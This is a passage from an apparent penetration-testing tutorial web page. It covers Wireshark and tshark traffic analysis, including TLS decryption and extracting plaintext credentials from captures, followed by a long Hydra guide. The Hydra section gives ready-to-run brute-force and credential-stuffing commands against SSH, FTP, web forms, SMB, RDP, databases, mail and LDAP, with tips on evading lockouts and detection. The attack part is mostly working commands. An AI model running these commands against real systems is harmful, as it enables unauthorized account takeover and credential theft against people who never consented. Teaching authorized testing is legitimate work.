# Can graph multiple filters simultaneously<br><br>

# Command-line (tshark):<br>
tshark -r capture.pcap -qz io,phs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Protocol hierarchy<br>
tshark -r capture.pcap -qz conv,tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# TCP conversations<br>
tshark -r capture.pcap -qz endpoints,ip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# IP endpoints</div>
            <p><strong>Why Use This?</strong> Get a bird's-eye view of network activity. "Who's talking to who?" "What protocols are used most?" "Which IP sent the most data?" Perfect for finding anomalies!</p>

            <h5>Expert Information - Find Problems</h5>
            <div class="code">
# Analyze → Expert Information (or bottom-left colorful button)<br><br>

# Error levels:<br>
# 🔴 Error: Serious problems (malformed packets, checksum errors)<br>
# 🟡 Warning: Suspicious activity (retransmissions, duplicate ACKs)<br>
# 🔵 Note: Informational (connection established, zero window)<br>
# 💬 Chat: Normal events (TCP handshakes, HTTP requests)<br><br>

# Common Expert Info:<br>
"TCP Previous segment not captured"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Packet loss detected<br>
"TCP Retransmission"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Packet was resent<br>
"TCP Dup ACK"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Duplicate acknowledgment<br>
"TCP Window Full"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Receiver buffer full<br>
"TCP Zero Window"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Receiver can't accept more data<br>
"Connection reset"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# TCP RST sent<br>
"Malformed Packet"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Invalid protocol data</div>
            <p><strong>Why Expert Info?</strong> Wireshark automatically analyzes captures and flags potential problems. Great starting point for troubleshooting!</p>

            <h5>Decrypting SSL/TLS Traffic</h5>
            <div class="code">
# Method 1: Use pre-master secret (from browser/client):<br>
# 1. Set environment variable BEFORE starting browser:<br>
export SSLKEYLOGFILE=/tmp/ssl_keys.log<br>
chromium-browser&nbsp;&nbsp;&nbsp;&nbsp;# Or firefox<br><br>

# 2. Browse HTTPS sites (keys logged to file)<br>
# 3. In Wireshark: Edit → Preferences → Protocols → TLS<br>
#&nbsp;&nbsp;&nbsp;&nbsp;→ (Pre)-Master-Secret log filename → Browse to /tmp/ssl_keys.log<br>
# 4. Reload capture - HTTPS traffic now decrypted!<br><br>

# Method 2: Use server's private key (if you own the server):<br>
# Wireshark → Edit → Preferences → Protocols → TLS<br>
# → RSA keys list → Add:<br>
#&nbsp;&nbsp;&nbsp;&nbsp;IP: 192.168.1.10<br>
#&nbsp;&nbsp;&nbsp;&nbsp;Port: 443<br>
#&nbsp;&nbsp;&nbsp;&nbsp;Protocol: http<br>
#&nbsp;&nbsp;&nbsp;&nbsp;Key File: /path/to/server.key<br><br>

# Limitations:<br>
# - Cannot decrypt if Diffie-Hellman (DHE/ECDHE) used without key logging<br>
# - Cannot decrypt traffic you didn't capture from the start</div>
            <p><strong>Real-World Use:</strong> Analyze your own HTTPS traffic for debugging, inspect encrypted malware communication (if you have keys), decrypt VPN traffic for forensics!</p>

            <h5>Command-Line Power (tshark)</h5>
            <div class="code">
# Basic tshark usage:<br>
tshark -r capture.pcap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Read and display<br>
tshark -r capture.pcap -Y "http"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Display filter<br>
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Extract specific fields<br><br>

# Common tshark flags:<br>
tshark -i eth0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture from interface<br>
tshark -r file.pcap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Read from file<br>
tshark -w output.pcap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Write to file<br>
tshark -Y "filter"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Display filter<br>
tshark -f "filter"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture filter<br>
tshark -c 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture 100 packets<br>
tshark -a duration:60&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Auto-stop after 60 seconds<br>
tshark -T fields&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Output as fields<br>
tshark -e field.name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Specify field to extract<br>
tshark -E separator=,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Field separator (for CSV)<br>
tshark -q&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Quiet mode (no per-packet output)<br>
tshark -z option&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Statistics<br><br>

# Extract HTTP URLs:<br>
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri<br><br>

# Extract DNS queries:<br>
tshark -r capture.pcap -Y "dns.qry.type == 1" -T fields -e dns.qry.name<br><br>

# Extract credentials:<br>
tshark -r capture.pcap -Y "http" | grep -i "password"<br>
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg<br><br>

# Count packets by protocol:<br>
tshark -r capture.pcap -qz io,phs<br><br>

# Export HTTP objects:<br>
tshark -r capture.pcap --export-objects http,./extracted/<br><br>

# Statistics:<br>
tshark -r capture.pcap -qz conv,tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# TCP conversations<br>
tshark -r capture.pcap -qz endpoints,ip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# IP endpoints<br>
tshark -r capture.pcap -qz http,tree&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP stats<br>
tshark -r capture.pcap -qz dns,tree&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# DNS stats</div>

            <div class="metaphor-box">
                <p><strong>🎯 Wireshark Mastery Summary:</strong></p>
                <p><strong>1. Capture Strategy:</strong> Use capture filters for large networks (reduces file size). Capture everything for small networks. Always save captures for later analysis!<br><br>
                <strong>2. Display Filters:</strong> Master these essentials: <code>http</code> (web traffic), <code>dns</code> (name resolution), <code>tcp.port == X</code> (specific service), <code>ip.addr == X</code> (specific host), <code>tcp.flags.syn == 1</code> (connection attempts), <code>tcp.analysis.retransmission</code> (network issues), <code>frame contains "password"</code> (credential search)<br><br>
                <strong>3. Follow Streams:</strong> Right-click packet → Follow → TCP/UDP/HTTP Stream to reconstruct entire conversations. Essential for reading HTTP requests, extracting FTP credentials, analyzing protocols.<br><br>
                <strong>4. Export Objects:</strong> File → Export Objects → HTTP/SMB to extract transferred files (images, downloads, documents, malware samples)<br><br>
                <strong>5. Statistics:</strong> Use Protocol Hierarchy for overview, Conversations to see who's talking to who, Endpoints to identify traffic volume. Use Expert Info (bottom-left) to automatically find problems.<br><br>
                <strong>6. SSL Decryption:</strong> Set <code>SSLKEYLOGFILE=/tmp/keys.log</code> BEFORE browsing, then load keys in Wireshark (Edit → Preferences → Protocols → TLS → Pre-Master-Secret log filename)<br><br>
                <strong>7. tshark Power:</strong> Automate analysis with <code>-Y</code> display filters, extract specific fields with <code>-T fields -e field.name</code>, generate statistics with <code>-qz</code>, export objects with <code>--export-objects</code><br><br>
                <strong>Real-World Workflows:</strong><br>
                • <strong>Web debugging:</strong> http filter → Follow HTTP Stream → Check request/response → Identify slow resources<br>
                • <strong>Malware analysis:</strong> dns filter → Identify C2 domains → http filter → Export Objects → Analyze payloads<br>
                • <strong>Network troubleshooting:</strong> tcp.analysis.retransmission → Expert Info → Identify packet loss/delays<br>
                • <strong>Credential harvesting:</strong> frame contains "password" → Follow TCP Stream → Extract plaintext credentials<br>
                • <strong>WiFi pentesting:</strong> Capture on wlan0mon → eapol filter → Extract WPA handshake → Crack with aircrack-ng<br><br>
                <strong>Golden Rules:</strong> (1) Capture first, ask questions later. (2) Use display filters, not capture filters (more flexible). (3) Follow streams to see the full picture. (4) Check Expert Info for automatic problem detection. (5) Save your captures! 🦈</p>
            </div>

            <h4>Hydra (THE Multi-Protocol Brute-Forcing Tool)</h4>

            <p><strong>What is Hydra?</strong> Hydra (also called THC-Hydra) is a <strong>parallelized network authentication cracker</strong>. It supports brute-forcing and dictionary attacks against 50+ protocols including SSH, FTP, HTTP, HTTPS, SMB, RDP, VNC, MySQL, PostgreSQL, MSSQL, SMTP, POP3, IMAP, LDAP, and many more. Think of it as the "Swiss Army knife" of password cracking - one tool, dozens of protocols!</p>
            <p><strong>Why Hydra?</strong> It's FAST (parallel connections), supports tons of protocols, has smart features (resume sessions, flexible username/password lists), and is the go-to tool for brute-forcing network services during pentests!</p>

            <h5>Basic Installation & Usage</h5>
            <div class="code">
# Hydra is pre-installed on Kali Linux<br>
hydra -h<br><br>

# Or install on other systems:<br>
sudo apt install hydra&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Debian/Ubuntu<br>
sudo yum install hydra&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# RedHat/CentOS<br>
brew install hydra&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# macOS<br><br>

# Basic syntax:<br>
hydra [options] [target] [protocol]://[IP/hostname]</div>

            <h5>Essential Hydra Flags</h5>
            <div class="code">
# Target specification:<br>
-l LOGIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Single username<br>
-L FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Username list file<br>
-p PASS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Single password<br>
-P FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Password list file<br>
-C FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Colon-separated "login:pass" file<br>
-M FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# List of target servers (one per line)<br><br>

# Performance options:<br>
-t TASKS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Number of parallel connections (default: 16)<br>
-w TIMEOUT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Timeout in seconds (default: 30)<br>
-W WAITTIME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Wait time between attempts (throttling)<br><br>

# Control options:<br>
-f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Exit after first found login/password<br>
-F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Exit after first valid login for any user<br>
-v&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Verbose output (show attempts)<br>
-V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Very verbose (show login+pass for every attempt)<br>
-q&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Quiet mode (don't show attempts)<br>
-o FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Write results to file<br>
-b FORMAT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Output format (text, json, jsonv1)<br><br>

# Protocol-specific options:<br>
-s PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Custom port number<br>
-S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Use SSL/TLS<br>
-m OPT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Module-specific options (varies by protocol)<br><br>

# Advanced options:<br>
-e nsr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Try "n" (null password), "s" (same as username), "r" (reverse username)<br>
-u&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Loop users first (try all passwords for user1, then user2, etc.)<br>
-R&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Restore previous session<br>
-I&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Ignore existing restore file (start fresh)</div>

            <p><strong>Flag Explanations:</strong></p>
            <ul>
                <li><strong>-l / -L:</strong> Single username vs username list. Use -L for realistic attacks (try multiple usernames)</li>
                <li><strong>-p / -P:</strong> Single password vs password list. Use -P with rockyou.txt or custom wordlists</li>
                <li><strong>-C:</strong> Colon-separated format (user:pass per line) - useful for credential stuffing attacks</li>
                <li><strong>-t:</strong> Parallel connections. Higher = faster BUT may trigger account lockouts or IDS alerts! Start with 4-8 for stealth</li>
                <li><strong>-w:</strong> Connection timeout. Increase for slow networks, decrease for fast scans</li>
                <li><strong>-f:</strong> Stop after first success. Good for testing if ANY credentials work</li>
                <li><strong>-v / -V:</strong> Verbose output. Use -v to monitor progress, -V for debugging</li>
                <li><strong>-e nsr:</strong> Try common patterns: n=null password (""), s=same as username (user=user, pass=user), r=reverse (user=john, pass=nhoj)</li>
                <li><strong>-u:</strong> Loop users NOT passwords. Default tries all passwords for user1, then user2. Use -u to avoid account lockouts!</li>
                <li><strong>-S:</strong> Use SSL/TLS. Essential for HTTPS, FTPS, IMAPS, POP3S, etc.</li>
            </ul>

            <h5>SSH Brute-Forcing</h5>
            <div class="code">
# Single username, password list:<br>
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5<br><br>

# Username + password lists:<br>
hydra -L users.txt -P passwords.txt ssh://192.168.1.100<br><br>

# Custom port:<br>
hydra -l root -P passwords.txt ssh://10.10.10.5 -s 2222<br><br>

# Verbose with 4 parallel connections (stealthy):<br>
hydra -l admin -P rockyou.txt -t 4 -v ssh://target.com<br><br>

# Try common patterns (null, same as username, reverse):<br>
hydra -L users.txt -e nsr ssh://10.10.10.5<br><br>

# Loop users first (avoid lockout):<br>
hydra -L users.txt -P passwords.txt -u ssh://10.10.10.5<br><br>

# Save results to file:<br>
hydra -l admin -P rockyou.txt -o ssh_results.txt ssh://10.10.10.5</div>
            <p><strong>Real-World Use:</strong> SSH is commonly exposed on pentests. Use small, targeted wordlists first (top 100 passwords), then escalate to rockyou.txt. ALWAYS use -u flag to avoid account lockouts!</p>

            <h5>FTP Brute-Forcing</h5>
            <div class="code">
# Basic FTP attack:<br>
hydra -l admin -P passwords.txt ftp://10.10.10.5<br><br>

# Custom port + verbose:<br>
hydra -l ftp -P rockyou.txt -s 2121 -v ftp://target.com<br><br>

# Try anonymous login + common passwords:<br>
hydra -l anonymous -e nsr ftp://192.168.1.100<br><br>

# Multiple targets from file:<br>
hydra -l admin -P passwords.txt -M ftp_targets.txt ftp</div>
            <p><strong>Pro Tip:</strong> Always try "anonymous:anonymous" or "anonymous:" (null password) first - many FTP servers allow anonymous login!</p>

            <h5>HTTP/HTTPS Form Brute-Forcing</h5>
            <div class="code">
# HTTP POST form attack:<br>
hydra -l admin -P passwords.txt 10.10.10.5 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"<br><br>

# HTTP GET form attack:<br>
hydra -l admin -P passwords.txt target.com http-get-form "/admin/login:user=^USER^&pass=^PASS^:F=incorrect"<br><br>

# HTTPS POST (SSL):<br>
hydra -l admin -P passwords.txt -S https://target.com http-post-form "/login:username=^USER^&password=^PASS^:Login failed"<br><br>

# With custom headers (User-Agent, Cookie):<br>
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid:H=User-Agent\: Mozilla/5.0:Cookie\: sessionid=abc123"<br><br>

# Success condition (redirect or success message):<br>
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:S=Welcome"</div>
            <p><strong>Form Syntax Breakdown:</strong></p>
            <ul>
                <li><strong>"/login.php":</strong> Path to login form</li>
                <li><strong>"username=^USER^&password=^PASS^":</strong> POST parameters (^USER^ and ^PASS^ are placeholders)</li>
                <li><strong>"Invalid credentials":</strong> Failure message (text that appears when login fails)</li>
                <li><strong>F=text:</strong> Failure condition (F= means look for this text on failure)</li>
                <li><strong>S=text:</strong> Success condition (S= means look for this text on success)</li>
                <li><strong>H=header:</strong> Add custom HTTP headers (multiple H= allowed)</li>
            </ul>
            <p><strong>How to Find Form Parameters:</strong> Use Burp Suite to capture login request, copy POST data, replace username/password values with ^USER^ and ^PASS^</p>

            <h5>HTTP Basic Authentication</h5>
            <div class="code">
# HTTP Basic Auth:<br>
hydra -l admin -P passwords.txt http-get://10.10.10.5/admin<br><br>

# HTTPS Basic Auth:<br>
hydra -l admin -P passwords.txt -S https://target.com/restricted<br><br>

# Custom port:<br>
hydra -l admin -P passwords.txt -s 8080 http-get://target.com/admin</div>
            <p><strong>What is Basic Auth?</strong> That popup box asking for username/password (not an HTML form). Common on routers, network devices, admin panels.</p>

            <h5>SMB / Windows Share Brute-Forcing</h5>
            <div class="code">
# SMB attack (Windows shares):<br>
hydra -l Administrator -P passwords.txt smb://10.10.10.5<br><br>

# Try null sessions + common passwords:<br>
hydra -L users.txt -e nsr smb://192.168.1.100<br><br>

# Domain authentication:<br>
hydra -l DOMAIN\\username -P passwords.txt smb://10.10.10.5</div>
            <p><strong>Real-World Use:</strong> SMB brute-forcing against Windows machines. Use with username enumeration (enum4linux, CrackMapExec) to build target list!</p>

            <h5>RDP (Remote Desktop) Brute-Forcing</h5>
            <div class="code">
# RDP attack:<br>
hydra -l administrator -P passwords.txt rdp://10.10.10.5<br><br>

# Custom port + verbose:<br>
hydra -l admin -P passwords.txt -s 3390 -v rdp://target.com<br><br>

# Low parallel connections (avoid lockout):<br>
hydra -l admin -P passwords.txt -t 2 rdp://10.10.10.5</div>
            <p><strong>WARNING:</strong> RDP often has account lockout policies! Use -t 1 or -t 2 (very slow) and -u flag (loop users). Consider using domain password policies to time attacks (e.g., lockout resets after 30 minutes).</p>

            <h5>VNC Brute-Forcing</h5>
            <div class="code">
# VNC attack (VNC uses password-only auth, no username):<br>
hydra -P passwords.txt vnc://10.10.10.5<br><br>

# Custom port:<br>
hydra -P passwords.txt -s 5901 vnc://target.com</div>
            <p><strong>VNC Note:</strong> VNC doesn't use usernames, only passwords! Use -P flag without -l / -L.</p>

            <h5>Database Brute-Forcing</h5>
            <div class="code">
# MySQL:<br>
hydra -l root -P passwords.txt mysql://10.10.10.5<br><br>

# PostgreSQL:<br>
hydra -l postgres -P passwords.txt postgresql://10.10.10.5<br><br>

# MSSQL (Microsoft SQL Server):<br>
hydra -l sa -P passwords.txt mssql://10.10.10.5<br><br>

# MongoDB (no auth by default, but can be configured):<br>
hydra -l admin -P passwords.txt mongodb://10.10.10.5<br><br>

# Oracle:<br>
hydra -l system -P passwords.txt oracle-listener://10.10.10.5</div>
            <p><strong>Common DB Users:</strong> MySQL: root, admin, dbuser | PostgreSQL: postgres, admin | MSSQL: sa (system admin), Administrator | MongoDB: admin, root</p>

            <h5>Email Protocol Brute-Forcing</h5>
            <div class="code">
# SMTP (port 25, 587, 465):<br>
hydra -l user@example.com -P passwords.txt smtp://mail.example.com<br>
hydra -l user@example.com -P passwords.txt -s 587 smtp://mail.example.com<br>
hydra -l user@example.com -P passwords.txt -S smtps://mail.example.com&nbsp;&nbsp;# SSL<br><br>

# POP3 (port 110, 995):<br>
hydra -l user@example.com -P passwords.txt pop3://mail.example.com<br>
hydra -l user@example.com -P passwords.txt -S pop3s://mail.example.com&nbsp;&nbsp;# SSL<br><br>

# IMAP (port 143, 993):<br>
hydra -l user@example.com -P passwords.txt imap://mail.example.com<br>
hydra -l user@example.com -P passwords.txt -S imaps://mail.example.com&nbsp;&nbsp;# SSL</div>
            <p><strong>Email Attack Strategy:</strong> Enumerate valid email addresses first (use theHarvester, Hunter.io), then brute-force with targeted wordlists (company name variations, seasons+year, etc.)</p>

            <h5>LDAP Brute-Forcing</h5>
            <div class="code">
# LDAP (Active Directory):<br>
hydra -l CN=admin,DC=example,DC=com -P passwords.txt ldap://10.10.10.5<br><br>

# LDAPS (SSL):<br>
hydra -l admin@example.com -P passwords.txt -S ldaps://dc.example.com</div>

            <h5>Other Supported Protocols</h5>
            <div class="code">
# Telnet:<br>
hydra -l admin -P passwords.txt telnet://10.10.10.5<br><br>

# Cisco devices (enable password):<br>
hydra -P passwords.txt cisco://10.10.10.5<br>
hydra -P passwords.txt cisco-enable://10.10.10.5<br><br>

# SNMP community strings:<br>
hydra -P community_strings.txt snmp://10.10.10.5<br><br>

# Redis:<br>
hydra -P passwords.txt redis://10.10.10.5<br><br>

# Rlogin:<br>
hydra -l root -P passwords.txt rlogin://10.10.10.5<br><br>

# Rsh:<br>
hydra -l root -P passwords.txt rsh://10.10.10.5<br><br>

# CVS:<br>
hydra -l admin -P passwords.txt cvs://10.10.10.5<br><br>

# Subversion (SVN):<br>
hydra -l admin -P passwords.txt svn://10.10.10.5<br><br>

# IRC:<br>
hydra -l nickname -P passwords.txt irc://irc.server.com<br><br>

# SOCKS5 proxy:<br>
hydra -l user -P passwords.txt socks5://10.10.10.5</div>

            <h5>Advanced Techniques</h5>
            <div class="code">
# Restore interrupted session:<br>
# Hydra saves progress automatically<br>
hydra -R&nbsp;&nbsp;# Resume last session<br><br>

# Ignore restore file (start fresh):<br>
hydra -I -l admin -P passwords.txt ssh://10.10.10.5<br><br>

# Multiple targets:<br>
# Create targets.txt (one IP/hostname per line)<br>
hydra -l admin -P passwords.txt -M targets.txt ssh<br><br>

# Colon-separated credentials (credential stuffing):<br>
# Create creds.txt with format: username:password<br>
hydra -C leaked_credentials.txt ssh://10.10.10.5<br><br>

# Custom timing (slow, stealthy):<br>
hydra -l admin -P passwords.txt -t 1 -w 30 ssh://10.10.10.5<br>
# -t 1 = one connection at a time<br>
# -w 30 = 30 second timeout<br><br>

# JSON output:<br>
hydra -l admin -P passwords.txt -b jsonv1 -o results.json ssh://10.10.10.5<br><br>

# Proxy through another host:<br>
hydra -l admin -P passwords.txt ssh://10.10.10.5 -m PROXY:proxy.example.com:8080</div>

            <h5>Wordlist Strategies</h5>
            <div class="code">
# Common wordlist locations (Kali Linux):<br>
/usr/share/wordlists/rockyou.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 14 million passwords<br>
/usr/share/wordlists/dirb/common.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Common passwords<br>
/usr/share/seclists/Passwords/Common-Credentials/&nbsp;&nbsp;# Curated lists<br>
/usr/share/seclists/Passwords/darkweb2017-top10000.txt<br><br>

# Extract rockyou.txt (if compressed):<br>
sudo gunzip /usr/share/wordlists/rockyou.txt.gz<br><br>

# Create custom wordlist (CeWL - website spider):<br>
cewl https://target-company.com -d 2 -m 5 -w custom_wordlist.txt<br>
# -d 2 = depth 2<br>
# -m 5 = minimum word length 5<br><br>

